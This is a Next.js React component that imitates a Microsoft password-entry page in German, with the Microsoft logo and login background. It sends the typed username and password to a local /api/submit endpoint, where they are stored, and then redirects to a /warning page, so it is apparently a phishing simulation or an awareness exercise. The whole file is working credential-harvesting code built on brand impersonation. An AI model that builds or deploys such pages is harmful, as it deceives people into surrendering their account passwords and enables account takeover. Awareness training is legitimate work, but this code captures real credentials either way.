'use client';

import { useState, useEffect } from 'react';
import Image from "next/image";
import { useRouter } from 'next/navigation';
import { RiEyeFill, RiEyeOffFill } from "react-icons/ri";
import { GoArrowLeft } from "react-icons/go";

export default function Authentication() {
  const router = useRouter();
  const [passwordVisible, setPasswordVisible] = useState(false);
  const [userInput, setUserInput] = useState('');
  const [passwordInput, setPasswordInput] = useState('');

  useEffect(() => {
    // Retrieve user input from local storage
    const storedUserInput = localStorage.getItem('userInput');
    if (storedUserInput) {
      setUserInput(storedUserInput);
    }
  }, []);

  const togglePasswordVisibility = () => {
    setPasswordVisible(!passwordVisible);
  };

  const handleBackClick = () => {
    router.push('/');
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    const response = await fetch('/api/submit', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({ userInput, passwordInput }),
    });

    if (response.ok) {
      // Handle success
      console.log('Data saved successfully');
    } else {
      // Handle error
      console.error('Failed to save data');
    }
    router.push('/warning');
  };

  return (
    <div 
      className="h-screen bg-cover bg-center" 
      style={{backgroundImage: "url('/microsoft-login-background.jpg')"}}>

      <div className="grid grid-rows-[20px_1fr_20px] items-center justify-items-center min-h-screen">
        <main className="flex flex-col gap-8 row-start-2 items-start p-12 bg-white shadow-lg">
          <Image
            src="/Microsoft_logo.svg"
            alt="Microsoft logo"
            width={130}
            height={30}
            priority
          />
          <div className="flex flex-row">
            <button
              type="button"
              onClick={handleBackClick}
              className="pr-2 flex items-center text-gray-500">
              <GoArrowLeft />
            </button>
            <p className="font-bold">{userInput}</p>
          </div>
          
          <h1 className="font-sans font-bold text-[28px]">Kennwort eingeben</h1>
          <form className="w-full flex flex-col gap-8 row-start-2 items-start" onSubmit={handleSubmit}>
            <div className="relative w-full mt-4">
              <input
                type={passwordVisible ? "text" : "password"}
                id="passwordInput"
                name="passwordInput"
                className="block w-full min-w-[350px] py-2 border-b-2 border-gray-300 focus:outline-none focus:ring-blue-500 focus:border-blue-500"
                placeholder="Passwort"
                value={passwordInput}
                onChange={(e) => setPasswordInput(e.target.value)}
              />
              <button
                type="button"
                onClick={togglePasswordVisibility}
                className="absolute inset-y-0 right-0 px-3 flex items-center text-gray-500"
              >
                {passwordVisible ? <RiEyeOffFill /> : <RiEyeFill />}
              </button>
            </div>
            <button type="submit" className="bg-blue-500 text-white px-10 py-2 mt-4">Weiter</button>
          </form>
        </main>
      </div>
    </div>
  );
};